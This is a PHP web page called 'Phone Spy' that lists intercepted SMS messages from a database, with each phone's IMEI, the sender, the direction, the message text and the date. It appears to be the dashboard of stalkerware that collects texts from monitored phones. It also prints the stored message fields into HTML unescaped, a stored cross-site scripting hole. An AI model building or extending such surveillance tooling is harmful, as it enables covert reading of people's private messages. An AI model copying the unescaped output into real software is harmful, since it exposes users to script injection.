<?php include 'db.php';?>
<?php
//Query the DB for messages
$strsql = "select * from MESSAGES ORDER BY ID DESC limit 100";
if ($result = $mysqli->query($strsql)) {
   // printf("<br>Select returned %d rows.\n", $result->num_rows);
} else {
    //Could be many reasons, but most likely the table isn't created yet. init.php will create the table.
    echo "<b>Can't query the database, did you <a href = init.php>Create the table</a> yet?</b>";
}
?>


<!DOCTYPE html>
<html>

<head>
    <title>Phone Spy</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <link rel="stylesheet" href="style.css" />
</head>

<body>
    <div class="">
        <img class="newappIcon" src="images/newapp-icon.png" />
        <h1>
			Welcome to the <span class="blue">Phone Spy</span>!
		</h1>
        <p class="description">
            You can drop datas in database with follow button.
            <br>
            <input type="button" class = "mybutton" onclick="window.location = 'init.php';" class="btn" value="(Re-)Create table"></input>
        </p>
        <br>

    
    <table id='notes' class='records'>
    <tbody>
        
        <?php
            echo "<tr>\n"; //the headings
            echo '<th class="no">' .  "No" . "</th>\n";
            echo '<th class="phone">' .  "Phone" . "</th>\n";
            echo '<th>' .  "Sender" . "</th>\n";
            echo '<th>' .  "Type" . "</th>\n";
            echo '<th class="msg">' .  "Message" . "</th>\n";
            echo '<th>' .  "Date" . "</th>\n";
            echo "</tr>\n";

            mysqli_data_seek ( $result, 0 );
            while ( $row = mysqli_fetch_row ( $result ) ) {
                $msg = get_message($row);
                $profile = find_profile($msg->userId);

                echo "<tr>\n";
                echo '<td class="no">' . $msg->ID . '</td>';
                echo '<td class="phone">' . $profile->iemiNo . '</td>';
                echo '<td class="sender">' . $msg->sender . '</td>';
                if ($msg->type == 1) {
                    echo '<td class="type">' . "Incoming" . '</td>';
                } else {
                    echo '<td class="type">' . "Outgoing" . '</td>';
                }
                echo '<td>' . $msg->message . '</td>';
                echo '<td class="date">' . $msg->time . '</td>';
                echo "</tr>\n";
            }

            $result->close();
        ?>
    </tbody>
    </table>

    </div>
</body>

</html>

<?php $mysqli->close(); ?>